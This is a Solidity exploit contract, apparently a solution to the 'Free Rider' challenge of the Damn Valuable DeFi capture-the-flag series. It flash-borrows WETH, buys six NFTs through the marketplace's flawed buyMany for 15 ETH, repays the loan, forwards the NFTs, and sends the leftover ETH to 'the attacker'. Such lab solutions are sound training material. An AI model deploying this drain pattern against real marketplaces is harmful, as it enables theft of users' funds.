// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";

interface IWETH {
    function deposit() external payable;

    function transfer(address to, uint256 value) external returns (bool);

    function withdraw(uint256) external;
}

contract FreeRiderFlashSwap {
    IWETH immutable WETH;
    FreeRiderNFTMarketplace immutable NFTMarketPlace;
    DamnValuableNFT immutable DVNFT;
    address immutable FREERiderBuyerAddress;

    constructor(
        address payable wethAddress,
        address payable nftmarketplaceAddress,
        address damnValuableNFTAddress,
        address freeRiderBuyerAddress
    ) {
        WETH = IWETH(wethAddress);
        NFTMarketPlace = FreeRiderNFTMarketplace(nftmarketplaceAddress);
        DVNFT = DamnValuableNFT(damnValuableNFTAddress);
        FREERiderBuyerAddress = freeRiderBuyerAddress;
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        //first unwrap the 15 WETH to receive 15 ETH
        WETH.withdraw(amount0);

        // then we buy the 6 DVNFTs for only 15 ETH
        uint256[] memory arrayTokenIds = new uint256[](6);
        arrayTokenIds[0] = 0;
        arrayTokenIds[1] = 1;
        arrayTokenIds[2] = 2;
        arrayTokenIds[3] = 3;
        arrayTokenIds[4] = 4;
        arrayTokenIds[5] = 5;
        NFTMarketPlace.buyMany{value: 15 ether}(arrayTokenIds);

        // we now have 75 ETH, enough to repay the flash swap
        WETH.deposit{value: (amount0 * 1000) / 997 + 1}();
        WETH.transfer(msg.sender, (amount0 * 1000) / 997 + 1);

        // we now send the DVNFTs to the buyer's contract
        DVNFT.safeTransferFrom(address(this), FREERiderBuyerAddress, 0);
        DVNFT.safeTransferFrom(address(this), FREERiderBuyerAddress, 1);
        DVNFT.safeTransferFrom(address(this), FREERiderBuyerAddress, 2);
        DVNFT.safeTransferFrom(address(this), FREERiderBuyerAddress, 3);
        DVNFT.safeTransferFrom(address(this), FREERiderBuyerAddress, 4);
        DVNFT.safeTransferFrom(address(this), FREERiderBuyerAddress, 5);

        // Optionally, we can send the remaining extra ETH to the attacker to make him richer
        address payable attacker = payable(tx.origin);
        attacker.transfer(address(this).balance);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
